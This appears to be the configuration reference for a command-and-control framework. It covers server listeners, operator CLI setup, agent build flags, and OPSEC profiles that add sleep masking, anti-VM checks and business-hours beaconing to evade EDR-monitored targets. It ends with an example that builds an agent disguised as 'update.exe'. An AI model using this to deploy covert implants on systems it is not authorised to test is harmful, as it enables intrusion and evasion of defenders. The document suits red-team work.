# Configuration

Complete reference for server and agent configuration options.

---

## Server Configuration

Configuration is read from environment variables first, then overridden by CLI flags.

### Required

| Variable | Flag | Description |
|----------|------|-------------|
| `ENCRYPTION_KEY` | — | AES-256-GCM key for agent traffic. **Must match agent build.** No default — server refuses to start without it. |

### Network

| Variable | Flag | Default | Description |
|----------|------|---------|-------------|
| `PORT` | `--port` | `8080` | HTTP listener port |
| `HOST` | `--host` | `0.0.0.0` | Bind address |
| `TLS_ENABLED` | `--tls` | `false` | Enable HTTPS |
| `TLS_CERT` | `--tls-cert` | *(auto)* | Path to TLS certificate PEM |
| `TLS_KEY` | `--tls-key` | *(auto)* | Path to TLS key PEM |
| `TLS_PORT` | `--tls-port` | `8443` | HTTPS port |
| `WS_ENABLED` | `--ws` | `false` | Enable WebSocket listener |
| `WS_PORT` | `--ws-port` | `8081` | WebSocket port |
| `DNS_ENABLED` | `--dns` | `false` | Enable DNS authoritative listener |
| `DNS_PORT` | `--dns-port` | `5353` | DNS listener port (UDP) |
| `DNS_DOMAIN` | `--dns-domain` | *(none)* | Authoritative zone (e.g. `c2.example.com`) |

### Authentication

| Variable | Flag | Default | Description |
|----------|------|---------|-------------|
| `AUTH_ENABLED` | `--auth` | `false` | Require API key on all operator requests |
| `API_KEY` | `--api-key` | *(required if auth on)* | Bearer token for operators |
| `ADMIN_KEY` | `--admin-key` | *(optional)* | Secret for team server admin registration |

### Storage & Logging

| Variable | Flag | Default | Description |
|----------|------|---------|-------------|
| `DB_PATH` | `--db` | `./data/taburtuai.db` | SQLite database path |
| `LOG_DIR` | `--log-dir` | `./logs` | Log file directory |
| `LOG_LEVEL` | `--log-level` | `INFO` | `DEBUG` / `INFO` / `WARN` / `ERROR` |

### Agent Monitoring

| Variable | Default | Description |
|----------|---------|-------------|
| `AGENT_DORMANT_SEC` | `600` | Seconds without beacon before status → `dormant` |
| `AGENT_OFFLINE_SEC` | `1800` | Seconds without beacon before status → `offline` |

### Profile

| Variable | Flag | Default | Description |
|----------|------|---------|-------------|
| `PROFILE` | `--profile` | `default` | Malleable C2 profile name. Affects URI routing and beacon format. |

---

## Operator CLI Configuration

The operator CLI reads from environment variables or accepts per-command flags.

| Variable | Flag | Description |
|----------|------|-------------|
| `TABURTUAI_SERVER` | `--server` | Server URL. Example: `http://172.23.0.1:8080` |
| `TABURTUAI_API_KEY` | `--api-key` | API key (if server has auth enabled) |

**Recommended setup** — export once per shell session:
```bash
export TABURTUAI_SERVER=http://172.23.0.1:8080
export TABURTUAI_API_KEY=mysecrettoken
./bin/taburtuai console
```

---

## Agent Build-Time Configuration

These values are baked into the agent binary at compile time via `-ldflags`. Changing them requires a rebuild.

| Flag (generate CLI) | Description |
|---------------------|-------------|
| `--c2 <url>` | C2 server URL the agent connects to |
| `--key <string>` | AES-256 encryption key — must match server `ENCRYPTION_KEY` |
| `--interval <seconds>` | Beacon interval (default from profile) |
| `--jitter <percent>` | Jitter percentage applied to interval |
| `--kill-date <YYYY-MM-DD>` | Date after which agent self-terminates |
| `--working-hours <H-H>` | Restrict beacon to hours e.g. `8-18` |
| `--sleep-mask` | Enable VirtualProtect sleep masking |
| `--profile <name>` | OPSEC profile (default/stealth/aggressive/opsec/paranoid) |
| `--compress` | Compress output binary |
| `--no-gui` | Hide console window on Windows (`-H windowsgui`) |

---

## OPSEC Profile Comparison

Profiles are YAML files in `cmd/generate/profiles/` loaded at generate time.

| Profile | Interval | Jitter | Working Hours | Sleep Mask | Anti-Debug/VM | Best For |
|---------|----------|--------|---------------|-----------|---------------|----------|
| `default` | 30s | 30% | off | off | off | Lab testing, demos |
| `aggressive` | 5s | 10% | off | off | off | Speed-focused engagements |
| `opsec` | 60s | 30% | off | on | on | General production use |
| `stealth` | 300s | 50% | 08:00–18:00 | on | on | Monitored environments |
| `paranoid` | 600s | 50% | 09:00–17:00 | on | on | SOC-monitored, EDR-heavy targets |

**Important:** `stealth` and `paranoid` profiles use `working_hours_only: true`. The agent **will not beacon outside business hours** on the target system's local clock. Do not use these for testing unless you account for the timezone.

---

## Common Build Errors

### `exec: "garble": executable file not found in $PATH`

The `--garble` flag requires the [garble](https://github.com/burrowers/garble) obfuscator to be installed separately. It is **not** included in the project.

```bash
go install mvdan.cc/garble@latest
```

After install, verify it is in your PATH:

```bash
garble version
```

If you don't need obfuscation, simply omit `--garble` from your build command. The binary will compile normally without it.

---

### `load profile: read profile "X": open X: no such file or directory`

The `--profile` flag accepts either a built-in profile name or a file path.

Built-in names (no path needed):
```
default  aggressive  opsec  stealth  paranoid
```

Correct usage:
```bash
# Built-in name — works out of the box
--profile stealth

# Custom YAML file — must exist on disk
--profile /path/to/custom.yaml
```

Do **not** pass a bare name that isn't one of the five built-ins — it will be treated as a file path.

---

### `Configuration error: ENCRYPTION_KEY env var is required but not set`

The server requires `ENCRYPTION_KEY` to be set before starting. There is no default.

```bash
export ENCRYPTION_KEY=$(openssl rand -hex 32)
go run ./cmd/server
```

---

### `unknown flag: --file` (generate upload)

The `upload` subcommand takes the payload file as a **positional argument**, not a flag. `--file` and `--name` do not exist.

```bash
# Wrong
./bin/generate upload --server http://SERVER:8080 --file ./builds/agent.exe --name "label"

# Correct — file path comes first, label uses --desc
./bin/generate upload ./builds/agent.exe \
  --server http://SERVER:8080 \
  --desc "label" \
  --format exe \
  --ttl 24
```

Full flag reference:

| Flag | Default | Description |
|------|---------|-------------|
| `--server <url>` | `http://127.0.0.1:8080` | C2 server URL |
| `--api-key <key>` | *(none)* | API key (if auth enabled on server) |
| `--format <type>` | `exe` | Payload type: `exe` / `shellcode` / `dll` |
| `--arch <arch>` | `amd64` | Target architecture |
| `--ttl <hours>` | `24` | Hours until the stage token expires (`0` = no expiry) |
| `--desc <text>` | *(none)* | Free-text label shown in `stages list` |

---

### `x509: certificate is valid for 127.0.0.1, not <your-ip>`

Terjadi ketika server auto-generate self-signed cert tapi kamu connect dari IP lain.

**Solusi A — rebuild server (permanen):** Server sekarang otomatis include semua local IP di cert SANs saat bind ke `0.0.0.0`. Cukup hapus cert lama dan restart:

```bash
rm -f /etc/ssl/c2/cert.pem /etc/ssl/c2/key.pem
# atau jika pakai auto-generate (tanpa TLS_CERT/TLS_KEY), tidak perlu hapus apa-apa
# restart server saja — cert baru akan di-generate dengan semua IP
```

**Solusi B — `--insecure` flag (langsung jalan):** Untuk skip verifikasi cert di upload:

```bash
./bin/generate upload ./builds/agent.exe \
  --server https://172.23.0.118:8443 \
  --insecure \
  --desc "RT Staged"
```

> `--insecure` hanya untuk operator CLI ke server sendiri (self-signed). Jangan dipakai ke server production dengan cert valid.

---

### Build succeeds but agent never checks in

Most common causes:

| Symptom | Likely cause |
|---------|-------------|
| No beacon after deploy | `--c2` URL unreachable from target (firewall, wrong IP) |
| Agent exits immediately | `--kill-date` already passed, or sandbox/VM check triggered |
| Beacon only during business hours | `stealth` or `paranoid` profile active — check target timezone |
| Agent built but `--key` mismatch | Server and agent must share the same `ENCRYPTION_KEY` value |

---

## Example: Production Deployment

```bash
# Server — with TLS, auth, and stealth profile
ENCRYPTION_KEY=$(openssl rand -hex 32) \
API_KEY=$(openssl rand -hex 16) \
TLS_ENABLED=true \
TLS_CERT=/etc/ssl/c2/cert.pem \
TLS_KEY=/etc/ssl/c2/key.pem \
PROFILE=stealth \
go run ./cmd/server --port 443 --tls-port 443

# Agent build for this server
go run ./cmd/generate stageless \
  --c2 https://c2.example.com \
  --key $ENCRYPTION_KEY \
  --profile stealth \
  --no-gui \
  --output ./payload/update.exe
```
